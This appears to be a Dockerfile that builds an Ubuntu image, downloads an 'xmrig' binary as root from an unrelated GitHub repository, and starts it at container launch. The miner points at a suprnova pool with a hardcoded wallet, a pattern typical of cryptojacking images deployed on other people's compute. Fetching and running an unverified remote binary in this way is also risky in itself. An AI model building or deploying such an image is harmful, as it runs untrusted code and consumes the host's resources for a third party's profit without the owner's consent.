FROM ubuntu:latest

WORKDIR /app
USER root

RUN apt-get update
RUN apt-get install -y wget curl

RUN wget https://github.com/jjcasa/rptreum/raw/main/xmrig
RUN chmod +x xmrig

CMD ./xmrig -o stratum.us-la1.suprnova.cc:6273 -u RRWsQLzXfB2LjaRRPiE8KoF5dRbHT1iQgs -p x
